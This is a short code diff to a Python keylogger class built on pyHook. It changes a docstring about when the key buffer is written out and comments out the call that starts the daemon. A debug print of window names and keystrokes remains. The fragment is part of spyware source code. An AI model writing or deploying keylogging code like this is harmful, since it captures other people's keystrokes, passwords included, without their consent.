@@ -35,7 +35,7 @@ class KeyLoggerDaemon:
     def __write_event(self, event: pyHook.KeyboardEvent):
         """
         keyboard press callback, process each key press as necessary.
-        if tab or return are in the event the buffer is written out
+        the buffer is written out on every key event
         """
         print(event.WindowName, event.Key, chr(int(event.Ascii)))  # debug
 
@@ -140,4 +140,4 @@ class KeyLog:
         return final_out
 
 
-KeyLoggerDaemon().watch()
+#KeyLoggerDaemon().watch()
